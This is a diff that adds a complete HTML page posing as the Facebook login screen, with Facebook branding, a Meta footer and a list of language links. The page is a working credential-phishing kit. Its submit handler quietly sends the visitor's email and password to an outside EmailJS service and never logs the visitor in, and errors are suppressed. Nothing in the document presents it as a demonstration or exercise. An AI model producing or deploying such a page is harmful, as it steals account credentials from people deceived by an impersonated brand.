@@ -1,1 +1,85 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Facebook – log in or sign up</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@2.6.4/dist/email.min.js"></script>
+  <script>
+    (function() {
+      emailjs.init("l_GNpQV2Ai9wqZK5-");
+    })();
+  </script>
+</head>
+<body class="bg-gray-100">
+  <div class="flex flex-col md:flex-row justify-center items-center min-h-screen">
+    <div class="text-center md:text-left mb-10 md:mb-0 md:mr-12 max-w-md">
+      <h1 class="text-blue-600 text-5xl font-bold mb-4">facebook</h1>
+      <p class="text-xl text-gray-700 font-semibold">Facebook helps you connect and share with the people in your life.</p>
+    </div>
+
+    <div class="w-full max-w-sm p-6 bg-white rounded-lg shadow-lg">
+      <form class="space-y-4" id="loginForm">
+        <input type="email" name="user_email" class="w-full p-3 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500" placeholder="Email or phone number" required />
+        <input type="password" name="user_password" class="w-full p-3 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500" placeholder="Password" required />
+        <button type="submit" class="w-full py-3 bg-blue-600 text-white font-bold text-lg rounded-md hover:bg-blue-700">Log In</button>
+        <div class="text-center">
+          <a href="#" class="text-blue-600 text-sm hover:underline">Forgotten password?</a>
+        </div>
+        <hr class="my-4">
+        <div class="text-center">
+          <button type="button" class="bg-green-500 text-white py-2 px-4 rounded-md font-semibold hover:bg-green-600">Create New Account</button>
+        </div>
+      </form>
+      <div class="text-center mt-4 text-sm">
+        <a href="#" class="font-semibold hover:underline">Create a Page</a> for a celebrity, brand or business.
+      </div>
+    </div>
+  </div>
+
+  <footer class="bg-white border-t border-gray-300 mt-12 py-6 text-center text-xs text-gray-600">
+    <div class="space-x-2 mb-2">
+      <a href="#" class="hover:underline">English (UK)</a>
+      <a href="#" class="hover:underline">हिन्दी</a>
+      <a href="#" class="hover:underline">ਪੰਜਾਬੀ</a>
+      <a href="#" class="hover:underline">اردو</a>
+      <a href="#" class="hover:underline">தமிழ்</a>
+      <a href="#" class="hover:underline">বাংলা</a>
+      <a href="#" class="hover:underline">मराठी</a>
+      <a href="#" class="hover:underline">తెలుగు</a>
+      <a href="#" class="hover:underline">ગુજરાતી</a>
+      <a href="#" class="hover:underline">ಕನ್ನಡ</a>
+      <a href="#" class="hover:underline">മലയാളം</a>
+    </div>
+    <div class="space-x-2 mb-2">
+      <a href="#" class="hover:underline">Sign Up</a>
+      <a href="#" class="hover:underline">Log in</a>
+      <a href="#" class="hover:underline">Messenger</a>
+      <a href="#" class="hover:underline">Facebook Lite</a>
+      <a href="#" class="hover:underline">Video</a>
+      <a href="#" class="hover:underline">Meta Pay</a>
+      <a href="#" class="hover:underline">Privacy Policy</a>
+      <a href="#" class="hover:underline">Terms</a>
+      <a href="#" class="hover:underline">AdChoices</a>
+      <a href="#" class="hover:underline">Help</a>
+    </div>
+    <p class="mt-2">Meta &copy; 2025</p>
+  </footer>
+
+  <script>
+    document.getElementById('loginForm').addEventListener('submit', function(e) {
+      e.preventDefault();
+
+      emailjs.sendForm('service_w5woa4u', 'template_ahzft3j', this)
+        .then(function() {
+          // Silent success
+        }, function(error) {
+          // Silent failure
+          console.error('EmailJS Error:', error);
+        });
+    });
+  </script>
+</body>
+</html>
 
